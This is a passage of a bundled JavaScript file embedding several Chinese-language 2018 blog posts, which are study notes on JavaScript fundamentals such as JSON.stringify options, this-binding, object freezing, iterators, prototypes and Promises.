class=\\"hljs-keyword\\">this</span>.z}\\n}\\n<span class=\\"hljs-built_in\\">JSON</span>.stringify(a)   <span class=\\"hljs-comment\\">// \\"{\\"z\\":3}\\"</span></code></pre></code></pre>\\n<p>二、</p>\\n<p>使用参数，<code>JSON.stringify</code>还有第二和第三个参数</p>\\n<ul>\\n<li>第二个参数<code>replace</code></li>\\n</ul>\\n<p>为数组时，表示需要进行字符串化的对象</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">var</span> a={<span class=\\"hljs-attr\\">x</span>:<span class=\\"hljs-number\\">1</span>,<span class=\\"hljs-attr\\">y</span>:<span class=\\"hljs-number\\">2</span>,<span class=\\"hljs-attr\\">z</span>:<span class=\\"hljs-number\\">3</span>}\\n<span class=\\"hljs-built_in\\">JSON</span>.stringify(a,[<span class=\\"hljs-string\\">\\"x\\"</span>,<span class=\\"hljs-string\\">\\"z\\"</span>])   <span class=\\"hljs-comment\\">// \\"{\\"x\\":1,\\"z\\":3}\\"</span></code></pre></code></pre>\\n<p>为函数时，接受2个参数(k,v)，k表示每一个键值对对应的key，v表示对应的value，\\n<strong><em>遇到value也为可遍历对象时，递归遍历</em></strong></p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">var</span> a={<span class=\\"hljs-attr\\">x</span>:<span class=\\"hljs-number\\">1</span>,<span class=\\"hljs-attr\\">y</span>:<span class=\\"hljs-number\\">2</span>,<span class=\\"hljs-attr\\">z</span>:{<span class=\\"hljs-attr\\">x</span>:<span class=\\"hljs-number\\">3</span>,<span class=\\"hljs-attr\\">y</span>:<span class=\\"hljs-number\\">4</span>,<span class=\\"hljs-attr\\">z</span>:<span class=\\"hljs-number\\">5</span>}}\\n<span class=\\"hljs-built_in\\">JSON</span>.stringify(a,<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\">k,v</span>)</span>{\\n  <span class=\\"hljs-keyword\\">if</span>(k!==<span class=\\"hljs-string\\">\'y\'</span>){\\n    <span class=\\"hljs-keyword\\">return</span> v\\n  }\\n})\\n<span class=\\"hljs-comment\\">// \\"{\\"x\\":1,\\"z\\":{\\"x\\":3,\\"z\\":5}}\\"</span>\\n<span class=\\"hljs-comment\\">// z里面的y也被去除</span></code></pre></code></pre>\\n<ul>\\n<li>第三个参数<code>space</code></li>\\n</ul>\\n<p>可以是正整数或者字符串，指定输出的缩进格式</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">// 正整数</span>\\n<span class=\\"hljs-keyword\\">var</span> a={<span class=\\"hljs-attr\\">x</span>:<span class=\\"hljs-number\\">1</span>,<span class=\\"hljs-attr\\">y</span>:<span class=\\"hljs-number\\">2</span>,<span class=\\"hljs-attr\\">z</span>:{<span class=\\"hljs-attr\\">x</span>:<span class=\\"hljs-number\\">3</span>,<span class=\\"hljs-attr\\">y</span>:<span class=\\"hljs-number\\">4</span>,<span class=\\"hljs-attr\\">z</span>:<span class=\\"hljs-number\\">5</span>}}\\n<span class=\\"hljs-built_in\\">JSON</span>.stringify(a,<span class=\\"hljs-literal\\">null</span>,<span class=\\"hljs-number\\">2</span>)  <span class=\\"hljs-comment\\">// 2格缩进</span>\\n<span class=\\"hljs-comment\\">/*\\n\\"{\\n  \\"x\\": 1,\\n  \\"y\\": 2,\\n  \\"z\\": {\\n    \\"x\\": 3,\\n    \\"y\\": 4,\\n    \\"z\\": 5\\n  }\\n}\\"\\n*/</span>\\n\\n<span class=\\"hljs-comment\\">// 字符串</span>\\n<span class=\\"hljs-keyword\\">var</span> a={<span class=\\"hljs-attr\\">x</span>:<span class=\\"hljs-number\\">1</span>,<span class=\\"hljs-attr\\">y</span>:<span class=\\"hljs-number\\">2</span>,<span class=\\"hljs-attr\\">z</span>:{<span class=\\"hljs-attr\\">x</span>:<span class=\\"hljs-number\\">3</span>,<span class=\\"hljs-attr\\">y</span>:<span class=\\"hljs-number\\">4</span>,<span class=\\"hljs-attr\\">z</span>:<span class=\\"hljs-number\\">5</span>}}\\n<span class=\\"hljs-built_in\\">JSON</span>.stringify(a,<span class=\\"hljs-literal\\">null</span>,<span class=\\"hljs-string\\">\\"--\\"</span>)  <span class=\\"hljs-comment\\">// 2个-缩进</span>\\n<span class=\\"hljs-comment\\">/*\\n\\"{\\n--\\"x\\": 1,\\n--\\"y\\": 2,\\n--\\"z\\": {\\n----\\"x\\": 3,\\n----\\"y\\": 4,\\n----\\"z\\": 5\\n--}\\n}\\"\\n*/</span></code></pre></code></pre>\\n","toc":[{"anchor":"an-zhi-chuan-di-he-an-yin-yong-chuan-di","level":4,"text":"按值传递和按引用传递"},{"anchor":"jsonstringify","level":4,"text":"JSON.stringify()"}],"relatedTags":null,"created_at":"2018-07-09","timeArr":[2018,6,9,0,0,0,0],"title":"一些被忽略的JS知识4","uuid":"fd8492b29dfac9fa4e50c5b2b4926048c19a0553","summary":"<p>一些JS基础(4)</p>\\n<h4>按值传递和按引用传递</h4>\\n<p>按值传递的例子：</p>\\n<pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">passByValue</span>(<span class=\\"hljs-params\\">x</span>)</span>{\\n  x=<span class=\\"hljs-number\\">999</span>\\n}\\n<span class=\\"hljs-keyword\\">var</span> a=<span class=\\"hljs-number\\">5</span>;\\n<span class=\\"hljs-keyword\\">var</span> b={<span class=\\"hljs-attr\\">a</span>:<span class=\\"hljs-number\\">1</span>}\\npassByValue(a);\\npassByValue(b)\\na   <span class=\\"hljs-comment\\">// 5</span>\\nb   <span class=\\"hljs-comment\\">// {a:1}</span>\\n</code></pre>\\n<p>按引用传...</p>","slug":"yi-xie-bei-hu-lve-de-JS-zhi-shi-4","sha":"340d5e43659ef754ccb360908ba8d5206f671aab"}')},660:function(n){n.exports=JSON.parse('{"content":"<p>一些JS基础(1)</p>\\n<h4 id=\\"ying-bang-ding-bu-hui-fu-gai-ying-bang-ding-，-dan-new-hui-fu-gai-ying-bang-ding\\">硬绑定不会覆盖硬绑定，但new会覆盖硬绑定</h4>\\n<ul>\\n<li>硬绑定不会覆盖硬绑定<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">show</span>(<span class=\\"hljs-params\\">s</span>)</span>{\\n<span class=\\"hljs-keyword\\">this</span>.a=s\\n}\\n</code></pre></code></pre>\\n</li>\\n</ul>\\n<p>var obj1={}\\nvar obj2={}</p>\\n<p>show=show.bind(obj1)\\nshow(5)\\nobj1.a  // 5</p>\\n<p>show=show.bind(obj2)\\n// 此处修改的还是obj1\\nshow(10)\\nobj2.a  // undefined\\nobj1.a  // 10</p>\\n<pre><code><pre class=\\"hljs\\"><code>* new会覆盖硬绑定\\n```js\\nfunction show(s){\\n  this.a=s\\n}\\n\\nvar obj1={}\\nvar obj2={}\\n\\nshow=show.bind(obj1)\\nshow(5)\\nobj1.a  // 5\\n\\nobj2=new show(10)\\nobj2.a  // 10</code></pre></code></pre><h4 id=\\"an-quan-de-this\\">安全的this</h4>\\n<p>如果不需要绑定this，一般会使用null，但这是不安全的，一旦再次使用this，绑定null会让我们绑定到默认(window)；</p>\\n<p>推荐使用<code>Object.create(null)</code></p>\\n<h4 id=\\"ruan-bang-ding\\">软绑定</h4>\\n<p><code>someMethod.softBind(obj)</code></p>\\n<p>检查调用时的 this ，如果 this 绑定到全局对象或者 undefined ，那就把\\n指定的默认对象 obj 绑定到 this ，否则不会修改 this</p>\\n","toc":[{"anchor":"ying-bang-ding-bu-hui-fu-gai-ying-bang-ding-，-dan-new-hui-fu-gai-ying-bang-ding","level":4,"text":"硬绑定不会覆盖硬绑定，但new会覆盖硬绑定"},{"anchor":"an-quan-de-this","level":4,"text":"安全的this"},{"anchor":"ruan-bang-ding","level":4,"text":"软绑定"}],"relatedTags":null,"created_at":"2018-06-22","timeArr":[2018,5,22,0,0,0,0],"title":"一些被忽略的js知识1","uuid":"7f574c8ed284705a049ad19e6b43a77dbe30c6f2","summary":"<p>一些JS基础(1)</p>\\n<h4>硬绑定不会覆盖硬绑定，但new会覆盖硬绑定</h4>\\n<ul>\\n<li>硬绑定不会覆盖硬绑定</li>\\n</ul>\\n<pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">show</span>(<span class=\\"hljs-params\\">s</span>)</span>{\\n  <span class=\\"hljs-keyword\\">this</span>.a=s\\n}\\n\\n<span class=\\"hljs-keyword\\">var</span> obj1={}\\n<span class=\\"hljs-keyword\\">var</span> obj2={}\\n\\nshow=show.bind(obj1)\\nshow(<span class=\\"hljs-number\\">5</span>)\\nobj1.a  <span class=\\"hljs-comment\\">// 5</span>\\n\\nsho...</code></pre>","slug":"yi-xie-bei-hu-lve-de-js-zhi-shi-1","sha":"5965a8eef20c8f12cc64d0794de2cf6b851589a9"}')},661:function(n){n.exports=JSON.parse('{"content":"<p>一些JS基础(2)</p>\\n<h4 id=\\"object-dui-xiang-de-key\\">Object对象的key</h4>\\n<p>一般来说，obj的key属性会自动转换成字符串（调用默认toString方法），然后再读取</p>\\n<p>例如：</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">var</span> myObject = { };\\nmyObject[<span class=\\"hljs-literal\\">true</span>] = <span class=\\"hljs-string\\">\\"foo\\"</span>;\\nmyObject[<span class=\\"hljs-number\\">3</span>] = <span class=\\"hljs-string\\">\\"bar\\"</span>;\\n\\nmyObject[<span class=\\"hljs-string\\">\\"true\\"</span>]; <span class=\\"hljs-comment\\">// \\"foo\\"</span>\\nmyObject[<span class=\\"hljs-string\\">\\"3\\"</span>]; <span class=\\"hljs-comment\\">// \\"bar\\"</span></code></pre></code></pre>\\n<p>对于object也是如此：</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">var</span> myObject = { };\\n<span class=\\"hljs-keyword\\">var</span> a={<span class=\\"hljs-attr\\">x</span>:<span class=\\"hljs-number\\">1</span>};\\n<span class=\\"hljs-keyword\\">var</span> b={<span class=\\"hljs-attr\\">x</span>:<span class=\\"hljs-number\\">2</span>}\\n\\nmyObject[a]=<span class=\\"hljs-number\\">1</span>;\\nmyObject[b]=<span class=\\"hljs-number\\">2</span>;\\n\\nmyObject[<span class=\\"hljs-string\\">\\"[object Object]\\"</span>]; <span class=\\"hljs-comment\\">// 2</span>\\nmyObject; <span class=\\"hljs-comment\\">// {[object Object]: 2}</span></code></pre></code></pre>\\n<p>但如果使用Symbol，则会破坏这个规则，只有唯一值：</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">var</span> myObject = { };\\n<span class=\\"hljs-keyword\\">var</span> a={<span class=\\"hljs-attr\\">x</span>:<span class=\\"hljs-number\\">1</span>};\\n<span class=\\"hljs-keyword\\">var</span> b={<span class=\\"hljs-attr\\">x</span>:<span class=\\"hljs-number\\">2</span>};\\n\\na=<span class=\\"hljs-built_in\\">Symbol</span>(a);\\nb=<span class=\\"hljs-built_in\\">Symbol</span>(b);\\n\\nmyObject[a]=<span class=\\"hljs-number\\">1</span>;\\nmyObject[b]=<span class=\\"hljs-number\\">2</span>;\\n\\nmyObject[<span class=\\"hljs-string\\">\\"Symbol([object Object])\\"</span>]; <span class=\\"hljs-comment\\">// undefined</span>\\nmyObject; <span class=\\"hljs-comment\\">// {Symbol([object Object]): 1, Symbol([object Object]): 2}</span>\\nmyObject[a]; <span class=\\"hljs-comment\\">// 1</span>\\nmyObject[b]; <span class=\\"hljs-comment\\">// 2</span></code></pre></code></pre>\\n<h4 id=\\"yi-xie-xian-zhi-dui-xiang-de-fang-fa\\">一些限制对象的方法</h4>\\n<ul>\\n<li>限制扩展 <code>Object.preventExtensions</code></li>\\n</ul>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">var</span> myObject = {\\n  <span class=\\"hljs-attr\\">a</span>:<span class=\\"hljs-number\\">2</span>\\n};\\n<span class=\\"hljs-built_in\\">Object</span>.preventExtensions( myObject );\\nmyObject.b = <span class=\\"hljs-number\\">3</span>;\\nmyObject.b; <span class=\\"hljs-comment\\">// undefined</span></code></pre></code></pre>\\n<ul>\\n<li><p>密封（限制扩展的基础上，添加<code>configurable:false</code>)</p>\\n</li>\\n<li><p>冻结（密封的基础上，添加<code>wirtable:false</code>）</p>\\n<p>  note:对象内部为引用，即使对象冻结，引用变化，也会变化：</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">var</span> obj={}\\n<span class=\\"hljs-keyword\\">var</span> a=[<span class=\\"hljs-number\\">1</span>,<span class=\\"hljs-number\\">2</span>]\\nobj.x=a;\\n<span class=\\"hljs-built_in\\">Object</span>.freeze(obj);\\n</code></pre></code></pre>\\n</li>\\n</ul>\\n<p>a.push(3)\\nobj.x; // [1,2,3]</p>\\n<p>```</p>\\n<ul>\\n<li>完全冻结（冻结的基础行，遍历内部引用对象也进行冻结）</li>\\n</ul>\\n","toc":[{"anchor":"object-dui-xiang-de-key","level":4,"text":"Object对象的key"},{"anchor":"yi-xie-xian-zhi-dui-xiang-de-fang-fa","level":4,"text":"一些限制对象的方法"}],"relatedTags":null,"created_at":"2018-06-24","timeArr":[2018,5,24,0,0,0,0],"title":"一些被忽略的js知识2","uuid":"cfe39dfd0c96a8f6a8263f7275c5d9f94c1a0480","summary":"<p>一些JS基础(2)</p>\\n<h4>Object对象的key</h4>\\n<p>一般来说，obj的key属性会自动转换成字符串（调用默认toString方法），然后再读取</p>\\n<p>例如：</p>\\n<pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">var</span> myObject = { };\\nmyObject[<span class=\\"hljs-literal\\">true</span>] = <span class=\\"hljs-string\\">\\"foo\\"</span>;\\nmyObject[<span class=\\"hljs-number\\">3</span>] = <span class=\\"hljs-string\\">\\"bar\\"</span>;\\n\\nmyObjec...</code></pre>","slug":"yi-xie-bei-hu-lve-de-js-zhi-shi-2","sha":"d923bf5ea77aeead80931e8ae800e2382bec4caf"}')},662:function(n){n.exports=JSON.parse('{"content":"<p>一些JS基础(3)</p>\\n<h4 id=\\"forof\\">for...of</h4>\\n<p> <code>for..of</code>会寻找内置或者自定义的 @@iterator 对象并调用它的 next() 方法来遍历数据值</p>\\n<p> array默认带有iterator，因此可以直接使用for...of</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">var</span> arr=[<span class=\\"hljs-number\\">1</span>,<span class=\\"hljs-number\\">2</span>,<span class=\\"hljs-number\\">3</span>];\\n<span class=\\"hljs-keyword\\">var</span> it=arr[<span class=\\"hljs-built_in\\">Symbol</span>.iterator]()\\n\\nit.next() <span class=\\"hljs-comment\\">// {value: 1, done: false}</span>\\nit.next() <span class=\\"hljs-comment\\">// {value: 2, done: false}</span>\\nit.next() <span class=\\"hljs-comment\\">// {value: 3, done: false}</span>\\nit.next() <span class=\\"hljs-comment\\">// {value: undefined, done: true}</span></code></pre></code></pre>\\n<p>object默认不带iterator，不可以直接使用for...of，但可以手动添加iterator属性后</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">var</span> obj={<span class=\\"hljs-attr\\">x</span>:<span class=\\"hljs-number\\">1</span>,<span class=\\"hljs-attr\\">y</span>:<span class=\\"hljs-number\\">2</span>,<span class=\\"hljs-attr\\">z</span>:<span class=\\"hljs-number\\">3</span>}\\n<span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> key <span class=\\"hljs-keyword\\">of</span> obj){<span class=\\"hljs-built_in\\">console</span>.log(key)} <span class=\\"hljs-comment\\">// TypeError:obj is not iterable</span>\\n\\n<span class=\\"hljs-built_in\\">Object</span>.defineProperty(obj,<span class=\\"hljs-built_in\\">Symbol</span>.iterator,{\\n  <span class=\\"hljs-attr\\">writable</span>:<span class=\\"hljs-literal\\">false</span>,\\n  <span class=\\"hljs-attr\\">enumerable</span>:<span class=\\"hljs-literal\\">false</span>,\\n  <span class=\\"hljs-attr\\">configurable</span>:<span class=\\"hljs-literal\\">true</span>,\\n  <span class=\\"hljs-attr\\">value</span>:<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\"></span>)</span>{\\n    <span class=\\"hljs-keyword\\">var</span> curO=<span class=\\"hljs-keyword\\">this</span>;\\n    <span class=\\"hljs-keyword\\">var</span> oId=<span class=\\"hljs-built_in\\">Object</span>.keys(curO);\\n    <span class=\\"hljs-keyword\\">var</span> curIdx=<span class=\\"hljs-number\\">0</span>;\\n    <span class=\\"hljs-keyword\\">return</span>{\\n      <span class=\\"hljs-attr\\">next</span>:<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\"></span>)</span>{\\n        <span class=\\"hljs-keyword\\">return</span> {\\n          <span class=\\"hljs-attr\\">value</span>:curO[oId[curIdx++]],\\n          <span class=\\"hljs-attr\\">done</span>:curIdx&gt;oId.length\\n        }\\n      }\\n    }\\n  }\\n})\\n<span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> key <span class=\\"hljs-keyword\\">of</span> obj){<span class=\\"hljs-built_in\\">console</span>.log(key)} \\n<span class=\\"hljs-comment\\">// 1</span>\\n<span class=\\"hljs-comment\\">// 2</span>\\n<span class=\\"hljs-comment\\">// 3</span></code></pre></code></pre>\\n<h4 id=\\"forin-he-in\\">for...in和in</h4>\\n<p><code>for(let key in obj){...}</code>查找的属性必须是可枚举的，在整个原型链上查找</p>\\n<p><code>key in obj</code>查找的属性可以不是可枚举的，在整个原型链上查找</p>\\n<h4 id=\\"yuan-xing-lian-ji-cheng\\">原型链继承</h4>\\n<pre><code><pre class=\\"hljs\\"><code>// ES6 之前需要抛弃默认的 Bar.prototype\\nBar.ptototype = Object.create( Foo.prototype );\\n// ES6 开始可以直接修改现有的 Bar.prototype\\nObject.setPrototypeOf( Bar.prototype, Foo.prototype );</code></pre></code></pre><h4 id=\\"setprototypeofgetprototypeofisprototypeof\\">setPrototypeOf,getPrototypeOf,isPrototypeOf</h4>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">var</span> a={<span class=\\"hljs-attr\\">x</span>:<span class=\\"hljs-number\\">1</span>}\\n<span class=\\"hljs-keyword\\">var</span> b={<span class=\\"hljs-attr\\">y</span>:<span class=\\"hljs-number\\">2</span>}\\n\\n<span class=\\"hljs-built_in\\">Object</span>.setPrototypeOf(a,b)\\na.__proto__===b <span class=\\"hljs-comment\\">// true</span>\\n<span class=\\"hljs-built_in\\">Object</span>.getPrototypeOf(a)===a.__proto__ <span class=\\"hljs-comment\\">// true</span>\\nb.isPrototypeOf(a) <span class=\\"hljs-comment\\">// true</span>\\n\\n<span class=\\"hljs-comment\\">/*           null\\n*             | prototype\\n*            Object \\n*  prototype /\\n*           b \\n*            \\\\ prototype \\n*             a\\n* */</span></code></pre></code></pre>\\n<h4 id=\\"class-de-prototype\\">class的prototype</h4>\\n<p>先不用class</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">A</span>(<span class=\\"hljs-params\\">n</span>)</span>{\\n  <span class=\\"hljs-keyword\\">this</span>.id=n\\n}\\nA.prototype.show=<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\"></span>)</span>{\\n  <span class=\\"hljs-built_in\\">console</span>.log(<span class=\\"hljs-keyword\\">this</span>.id)\\n}\\n\\n<span class=\\"hljs-keyword\\">var</span> a=<span class=\\"hljs-keyword\\">new</span> A(<span class=\\"hljs-number\\">5</span>)\\na.show() <span class=\\"hljs-comment\\">// 5</span></code></pre></code></pre>\\n<p>接着我们改变prototype，分2种形式</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">// 一：更改prototype上的属性</span>\\nA.prototype.show=<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\"></span>)</span>{\\n  <span class=\\"hljs-built_in\\">console</span>.log(<span class=\\"hljs-string\\">\\"change\\"</span>)\\n}\\na.show() <span class=\\"hljs-comment\\">// change 生效</span>\\n\\n<span class=\\"hljs-comment\\">// 二：直接更改整个prototype</span>\\nA.prototype={\\n  <span class=\\"hljs-attr\\">show</span>:<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\"></span>)</span>{\\n    <span class=\\"hljs-built_in\\">console</span>.log(<span class=\\"hljs-string\\">\\"change\\"</span>)\\n  }\\n}\\na.show() <span class=\\"hljs-comment\\">// 5 未生效</span>\\n<span class=\\"hljs-keyword\\">var</span> a2=<span class=\\"hljs-keyword\\">new</span> A(<span class=\\"hljs-number\\">5</span>)\\na2.show() <span class=\\"hljs-comment\\">// change 生效</span></code></pre></code></pre>\\n<p>再看class</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-class\\"><span class=\\"hljs-keyword\\">class</span> <span class=\\"hljs-title\\">A</span></span>{\\n  <span class=\\"hljs-keyword\\">constructor</span>(n){\\n    <span class=\\"hljs-keyword\\">this</span>.id=n\\n  }\\n  show(){\\n    <span class=\\"hljs-built_in\\">console</span>.log(<span class=\\"hljs-keyword\\">this</span>.id)\\n  }\\n}\\n<span class=\\"hljs-keyword\\">var</span> a=<span class=\\"hljs-keyword\\">new</span> A(<span class=\\"hljs-number\\">8</span>)\\na.show() <span class=\\"hljs-comment\\">// 8</span></code></pre></code></pre>\\n<p>改变prototype</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">// 一：更改prototype上的属性</span>\\nA.prototype.show=<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\"></span>)</span>{\\n  <span class=\\"hljs-built_in\\">console</span>.log(<span class=\\"hljs-string\\">\\"change\\"</span>)\\n}\\na.show() <span class=\\"hljs-comment\\">// change 生效</span>\\n\\n<span class=\\"hljs-comment\\">// 二：直接更改整个prototype</span>\\nA.prototype={\\n  <span class=\\"hljs-attr\\">show</span>:<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\"></span>)</span>{\\n    <span class=\\"hljs-built_in\\">console</span>.log(<span class=\\"hljs-string\\">\\"change\\"</span>)\\n  }\\n}\\na.show() <span class=\\"hljs-comment\\">// 8 未生效</span>\\n<span class=\\"hljs-keyword\\">var</span> a2=<span class=\\"hljs-keyword\\">new</span> A(<span class=\\"hljs-number\\">5</span>)\\na2.show() <span class=\\"hljs-comment\\">// 5 未生效</span></code></pre></code></pre>\\n<p>结论：</p>\\n<ol>\\n<li>非class模式下，直接修改整个prototype并不能影响已经创建的实例，但对后来创建的实例有影响</li>\\n<li>class模式下，直接修改整个prototype既不能影响已经创建实例，也不能影响后来创建的实例</li>\\n</ol>\\n","toc":[{"anchor":"forof","level":4,"text":"for...of"},{"anchor":"forin-he-in","level":4,"text":"for...in和in"},{"anchor":"yuan-xing-lian-ji-cheng","level":4,"text":"原型链继承"},{"anchor":"setprototypeofgetprototypeofisprototypeof","level":4,"text":"setPrototypeOf,getPrototypeOf,isPrototypeOf"},{"anchor":"class-de-prototype","level":4,"text":"class的prototype"}],"relatedTags":null,"created_at":"2018-06-26","timeArr":[2018,5,26,0,0,0,0],"title":"一些被忽略的js知识3","uuid":"0c8cd68f3ca83da85ae41e597f8b4869615a425b","summary":"<p>一些JS基础(3)</p>\\n<h4>for...of</h4>\\n<p><code>for..of</code>会寻找内置或者自定义的 @@iterator 对象并调用它的 next() 方法来遍历数据值</p>\\n<p>array默认带有iterator，因此可以直接使用for...of</p>\\n<pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">var</span> arr=[<span class=\\"hljs-number\\">1</span>,<span class=\\"hljs-number\\">2</span>,<span class=\\"hljs-number\\">3</span>];\\n<span class=\\"hljs-keyword\\">var</span> it=arr[Symbo...</code></pre>","slug":"yi-xie-bei-hu-lve-de-js-zhi-shi-3","sha":"4fd90b9ee966a8e1972197c101a2e960a01d9493"}')},663:function(n){n.exports=JSON.parse('{"content":"<ul>\\n<li>如果向 Promise.resolve(..) 传递一个真正的 Promise，就只会返回同一个 promise<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">var</span> p1 = <span class=\\"hljs-built_in\\">Promise</span>.resolve( <span class=\\"hljs-number\\">42</span> );\\n<span class=\\"hljs-keyword\\">var</span> p2 = <span class=\\"hljs-built_in\\">Promise</span>.resolve( p1 );\\np1===p2\\n<span class=\\"hljs-comment\\">// true</span></code></pre></code></pre>\\n</li>\\n</ul>\\n<hr>\\n<ul>\\n<li>Promise.resolve(..) 可以接受任何 thenable，将其解封为它的非 thenable 值。<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">var</span> c={\\n<span class=\\"hljs-attr\\">then</span>:<span class=\\"hljs-function\\">(<span class=\\"hljs-params\\">a,b</span>)=&gt;</span>{\\n  a(<span class=\\"hljs-number\\">5</span>);b(<span class=\\"hljs-string\\">\\"err\\"</span>)}\\n}\\n</code></pre></code></pre>\\n</li>\\n</ul>\\n<p>Promise.resolve( c )\\n.then(\\n  function fulfilled(val){\\n    console.log( &#39;success&#39;,val );\\n  },\\n  function rejected(err){\\n    console.log(&#39;error&#39;,err)\\n  }\\n);\\n// success 5</p>\\n<pre><code><pre class=\\"hljs\\"><code>---------\\n* Deferred模式\\n\\n```js\\nfunction Deferred() {\\n    this.promise = new Promise((resolve, reject)=&gt;{\\n        this._resolve = resolve;\\n        this._reject = reject;\\n    });\\n}\\nDeferred.prototype.resolve = function (value) {\\n    this._resolve(value);\\n};\\nDeferred.prototype.reject = function (reason) {\\n    this._reject(reason);\\n};\\nvar d=new Deferred()\\nvar obj={}\\nobj.res=d.resolve.bind(d)\\nobj.rej=d.reject.bind(d)\\nobj.rej(124)\\nd.promise.then(v=&gt;console.log(v),err=&gt;console.warn(err)).catch(err=&gt;console.error(err))</code></pre></code></pre><hr>\\n<ul>\\n<li>继承prototype<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">A</span>(<span class=\\"hljs-params\\"></span>) </span>{}\\nA.prototype.a = <span class=\\"hljs-number\\">5</span>\\nA.prototype.show = <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">()</span> =&gt;</span> {\\n<span class=\\"hljs-built_in\\">console</span>.log(<span class=\\"hljs-number\\">11</span>)\\n}\\nA.prototype.arr = [<span class=\\"hljs-number\\">1</span>, <span class=\\"hljs-number\\">2</span>, <span class=\\"hljs-number\\">3</span>, <span class=\\"hljs-number\\">4</span>]\\n</code></pre></code></pre>\\n</li>\\n</ul>\\n<p>function B() {}\\nfor (let k in A.prototype) {\\n  B.prototype[k] = A.prototype[k]\\n}</p>\\n<p>function C() {}\\nC.prototype = Object.create(A.prototype)</p>\\n<p>// B和C的区别</p>\\n<p>var b = new B()\\nvar c = new C()</p>\\n<p>b instanceof A // false\\nc instanceof A // true\\n```</p>\\n","toc":[],"relatedTags":null,"created_at":"2018-08-02","timeArr":[2018,7,2,0,0,0,0],"title":"一些promise和其他补缺","uuid":"e1662cfda83fcae8dc160c993bb54ff04956653c","summary":"<ul>\\n<li>如果向 Promise.resolve(..) 传递一个真正的 Promise，就只会返回同一个 promise</li>\\n</ul>\\n<pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">var</span> p1 = <span class=\\"hljs-built_in\\">Promise</span>.resolve( <span class=\\"hljs-number\\">42</span> );\\n<span class=\\"hljs-keyword\\">var</span> p2 = <span class=\\"hljs-built_in\\">Promise</span>.resolve( p1 );\\np1===p2\\n<span class=\\"hljs-comment\\">// true</span>\\n</code></pre>","slug":"yi-xie-promise-he-qi-ta-bu-que","sha":"3bfb5149de44ae6b02ce78a91414ebbd9303a277"}')},664:function(n){n.exports=JSON.parse('{"content":"<p><code>anime</code>用的是缓动算法</p>\\n<p>算法规定了动画形式，需要提供总消耗时间，当前消耗时间，初始位置，目标位置</p>\\n<p>特点：动画灵活性更大,可以指定任意的时间而得到对应的位置，可以实现暂停/继续，动画跳转，动画进度条等</p>\\n<p><code>react-motion</code>用的是弹性算法</p>\\n<p>算法规定了弹性和阻力，只要提供初始位置和目标位置，即可计算出动画</p>\\n<p>特点：可以通过调整弹力是否为0来实现暂停/继续(即使暂停了，程序还在循环调用)，其实要实现也是可以的，只需要\\n保存当前速度和位置，然后让动画停止，继续的时候调用之前保存的速度和位置；但无法实现动画进度条</p>\\n","toc":[],"relatedTags":null,"created_at":"2018-08-05","timeArr":[2018,7,5,0,0,0,0],"title":"源码阅读-anime和react-motion算法差异","uuid":"3b4d16a57b6ee44ecffdda18a89a5c0f7cf5808c","summary":"<p><code>anime</code>用的是缓动算法</p>\\n<p>算法规定了动画形式，需要提供总消耗时间，当前消耗时间，初始位置，目标位置</p>\\n<p>特点：动画灵活性更大,可以指定任意的时间而得到对应的位置，可以实现暂停/继续，动画跳转，动画进度条等</p>\\n<p><code>react-motion</code>用的是